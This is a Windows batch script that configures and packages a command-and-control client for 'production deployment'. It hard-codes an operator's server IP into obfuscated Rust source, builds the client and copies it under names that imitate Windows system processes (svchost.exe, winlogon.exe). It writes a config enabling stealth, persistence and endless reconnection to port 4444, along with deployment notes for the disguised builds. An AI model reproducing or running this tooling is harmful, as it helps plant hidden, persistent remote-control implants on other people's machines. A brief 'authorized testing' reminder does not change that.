@echo off
setlocal enabledelayedexpansion

echo ========================================
echo  C2 Production Configuration Setup
echo ========================================
echo.

:input_server
set /p SERVER_IP="Enter your production server IP or domain: "
if "%SERVER_IP%"=="" (
    echo Error: Server IP cannot be empty!
    goto input_server
)

echo.
echo [INFO] Configuring client for production server: %SERVER_IP%

echo [1] Updating client source code...
cd /d "%~dp0"

rem Backup original file
copy "c2_client\src\main.rs" "c2_client\src\main.rs.backup" >nul 2>&1

rem Update command line default
powershell -Command "(Get-Content 'c2_client\src\main.rs') -replace 'default_value = \"YOUR_VPS_IP\"', 'default_value = \"%SERVER_IP%\"' | Set-Content 'c2_client\src\main.rs'"

rem Update release mode default
powershell -Command "(Get-Content 'c2_client\src\main.rs') -replace 'obfuscate_string\(\"YOUR_VPS_IP\"\)', 'obfuscate_string(\"%SERVER_IP%\")' | Set-Content 'c2_client\src\main.rs'"

echo [2] Building production client...
call build.bat

if %errorlevel% neq 0 (
    echo [ERROR] Build failed! Restoring backup...
    copy "c2_client\src\main.rs.backup" "c2_client\src\main.rs" >nul 2>&1
    pause
    exit /b 1
)

echo.
echo [3] Creating production deployment package...
mkdir "production_deploy" >nul 2>&1
copy "output\c2_client.exe" "production_deploy\" >nul 2>&1
copy "output\svchost.exe" "production_deploy\" >nul 2>&1
copy "output\system_update.exe" "production_deploy\" >nul 2>&1
copy "output\winlogon.exe" "production_deploy\" >nul 2>&1

echo [4] Creating production config file...
echo [network] > "production_deploy\client_config.toml"
echo server_address = "%SERVER_IP%" >> "production_deploy\client_config.toml"
echo server_port = 4444 >> "production_deploy\client_config.toml"
echo reconnect_delay = 30 >> "production_deploy\client_config.toml"
echo heartbeat_interval = 60 >> "production_deploy\client_config.toml"
echo command_poll_interval = 5 >> "production_deploy\client_config.toml"
echo max_reconnect_attempts = 0 >> "production_deploy\client_config.toml"
echo. >> "production_deploy\client_config.toml"
echo [features] >> "production_deploy\client_config.toml"
echo persistence_enabled = true >> "production_deploy\client_config.toml"
echo stealth_mode = true >> "production_deploy\client_config.toml"

echo [5] Creating deployment instructions...
echo # Production C2 Client Deployment > "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo Server: %SERVER_IP%:4444 >> "production_deploy\DEPLOY.md"
echo Build Date: %date% %time% >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ## Deployment Options: >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ### Standard Deployment: >> "production_deploy\DEPLOY.md"
echo c2_client.exe >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ### Disguised Names: >> "production_deploy\DEPLOY.md"
echo svchost.exe          # Windows service host >> "production_deploy\DEPLOY.md"
echo system_update.exe    # System update utility >> "production_deploy\DEPLOY.md"
echo winlogon.exe         # Windows logon process >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ### Manual Server Override: >> "production_deploy\DEPLOY.md"
echo c2_client.exe --server %SERVER_IP% --port 4444 >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ### Stealth Mode (Default in Release): >> "production_deploy\DEPLOY.md"
echo c2_client.exe >> "production_deploy\DEPLOY.md"
echo. >> "production_deploy\DEPLOY.md"
echo ### Debug Mode (No Stealth/Persistence): >> "production_deploy\DEPLOY.md"
echo c2_client.exe --no-stealth --no-persistence >> "production_deploy\DEPLOY.md"

echo.
echo ========================================
echo  ✅ Production Configuration Complete!
echo ========================================
echo.
echo 📁 Deployment Package: .\production_deploy\
echo 🎯 Target Server: %SERVER_IP%:4444
echo 📋 Instructions: .\production_deploy\DEPLOY.md
echo.
echo 🚀 Ready for deployment!
echo.
echo Files created:
dir "production_deploy" /b

echo.
echo ⚠️  IMPORTANT REMINDERS:
echo - Ensure your server (%SERVER_IP%) is running on port 4444
echo - Test connectivity: telnet %SERVER_IP% 4444
echo - Use only for authorized testing!
echo - Configure firewall rules as needed
echo.
pause
